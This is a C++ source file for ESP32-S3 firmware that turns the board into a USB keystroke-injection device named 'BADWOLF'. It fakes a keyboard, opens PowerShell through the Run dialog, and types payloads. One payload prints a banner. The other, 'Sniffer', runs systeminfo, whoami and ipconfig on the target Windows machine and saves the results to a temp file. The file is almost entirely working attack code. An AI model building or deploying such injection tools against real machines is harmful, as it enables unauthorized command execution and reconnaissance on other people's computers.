/*
 * NOCTURNE_OS — BADWOLF USB HID: Matrix (short) and Sniffer (long) payloads.
 * Uses USB.h + USBHIDKeyboard.h (ESP32-S3 native USB).
 */
#include "UsbManager.h"
#include <soc/soc_caps.h>

#if SOC_USB_OTG_SUPPORTED
#include "USB.h"
#include "USBHIDKeyboard.h"

static USBHIDKeyboard *s_keyboard = nullptr;
#endif

UsbManager::UsbManager() {}

void UsbManager::begin() {
#if SOC_USB_OTG_SUPPORTED
  if (active_)
    return;
  USB.begin();
  if (!s_keyboard)
    s_keyboard = new USBHIDKeyboard();
  s_keyboard->begin();
  active_ = true;
  Serial.println("[BADWOLF] USB HID Keyboard ARMED.");
#else
  (void)0;
  Serial.println("[BADWOLF] USB not supported on this board.");
#endif
}

void UsbManager::stop() {
#if SOC_USB_OTG_SUPPORTED
  if (!active_)
    return;
  if (s_keyboard) {
    s_keyboard->end();
    delete s_keyboard;
    s_keyboard = nullptr;
  }
  active_ = false;
  Serial.println("[BADWOLF] USB HID disarmed.");
#else
  (void)0;
#endif
}

#if SOC_USB_OTG_SUPPORTED
void UsbManager::ensureEnglishLayout() {
  if (!s_keyboard)
    return;
  s_keyboard->press(KEY_LEFT_ALT);
  s_keyboard->press(KEY_LEFT_SHIFT);
  delay(50);
  s_keyboard->releaseAll();
  delay(100);
}

void UsbManager::openPowerShell() {
  if (!s_keyboard)
    return;
  ensureEnglishLayout();
  delay(200);
  s_keyboard->press(KEY_LEFT_GUI);
  s_keyboard->press('r');
  s_keyboard->releaseAll();
  delay(BADWOLF_DELAY_AFTER_RUN_MS);
  s_keyboard->print("powershell");
  delay(300);
  s_keyboard->press(KEY_RETURN);
  s_keyboard->releaseAll();
  delay(BADWOLF_DELAY_AFTER_POWERSHELL_MS);
}
#endif

void UsbManager::runMatrix() {
#if SOC_USB_OTG_SUPPORTED
  if (!s_keyboard || !active_)
    return;
  openPowerShell();
  const char *msg = "NOCTURNE_OS // BADWOLF // MATRIX STALKER";
  for (size_t i = 0; msg[i]; i++) {
    s_keyboard->write((uint8_t)msg[i]);
    delay(BADWOLF_MATRIX_CHAR_DELAY_MS);
  }
  s_keyboard->press(KEY_RETURN);
  s_keyboard->releaseAll();
  Serial.println("[BADWOLF] Matrix payload sent.");
#else
  (void)0;
#endif
}

void UsbManager::runSniffer() {
#if SOC_USB_OTG_SUPPORTED
  if (!s_keyboard || !active_)
    return;
  openPowerShell();
  // Pipe systeminfo, whoami, ipconfig to temp file and open in Notepad
  const char *cmd = "systeminfo; whoami; ipconfig | Out-File -FilePath "
                    "$env:TEMP\\sniff.txt; notepad $env:TEMP\\sniff.txt";
  s_keyboard->print(cmd);
  delay(200);
  s_keyboard->press(KEY_RETURN);
  s_keyboard->releaseAll();
  Serial.println("[BADWOLF] Sniffer payload sent.");
#else
  (void)0;
#endif
}
